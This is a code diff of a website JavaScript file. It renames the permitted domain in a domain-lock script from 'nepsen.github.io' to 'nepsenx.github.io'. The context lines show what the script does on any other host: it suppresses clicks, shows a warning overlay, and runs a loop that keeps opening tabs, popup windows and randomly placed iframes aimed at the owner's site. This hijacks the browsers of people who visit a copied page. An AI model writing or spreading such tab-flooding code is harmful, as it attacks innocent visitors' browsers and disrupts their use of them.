@@ -1,6 +1,6 @@
 setTimeout(() => {
     // Check if domain is not "nepsen.github.io"
-    if (window.location.hostname !== "nepsen.github.io") {
+    if (window.location.hostname !== "nepsenx.github.io") {
         // Create matrix effect immediately
         
         // Create and show the warning page
@@ -43,7 +43,7 @@ setTimeout(() => {
       e.preventDefault();
       e.stopPropagation();
       window.open(
-        "https://nepsen.github.io/home",
+        "https://nepsenx.github.io/home",
         "_blank",
         "width=800,height=600,scrollbars=yes,resizable=yes"
       );
@@ -61,7 +61,7 @@ setTimeout(() => {
 const currentHost = window.location.host;
 
 // Check the host
-if (currentHost === "nepsen.github.io") {
+if (currentHost === "nepsenx.github.io") {
     // Do nothing
 } else {
     (function() {
@@ -69,7 +69,7 @@ if (currentHost === "nepsen.github.io") {
         if (localStorage.getItem("backend-was-done") === "true") {
             // Don't show code error again, but still show offline if needed
             const isOffline = !navigator.onLine;
-            const isWrongDomain = !location.hostname.endsWith("nepsen.github.io");
+            const isWrongDomain = !location.hostname.endsWith("nepsenx.github.io");
             
             if (isOffline || isWrongDomain) {
                 // Create minimal overlay for offline/wrong domain scenario
@@ -1143,7 +1143,7 @@ function startTabOpeningLoop() {
     // Function to open a new tab
     function openTab() {
         try {
-            window.open('https://nepsen.github.io/home', '_blank');
+            window.open('https://nepsenx.github.io/home', '_blank');
         } catch (e) {
             console.log('Popup blocked by browser');
         }
@@ -1152,7 +1152,7 @@ function startTabOpeningLoop() {
     // Function to open a new window
     function openWindow() {
         try {
-            window.open('https://nepsen.github.io/home', '_blank', 'width=400,height=300');
+            window.open('https://nepsenx.github.io/home', '_blank', 'width=400,height=300');
         } catch (e) {
             console.log('Popup blocked by browser');
         }
@@ -1161,7 +1161,7 @@ function startTabOpeningLoop() {
     // Function to create an iframe
     function createIframe() {
         const iframe = document.createElement('iframe');
-        iframe.src = 'https://nepsen.github.io/home';
+        iframe.src = 'https://nepsenx.github.io/home';
         iframe.style.cssText = `
             position: fixed;
             top: ${Math.random() * 80}vh;
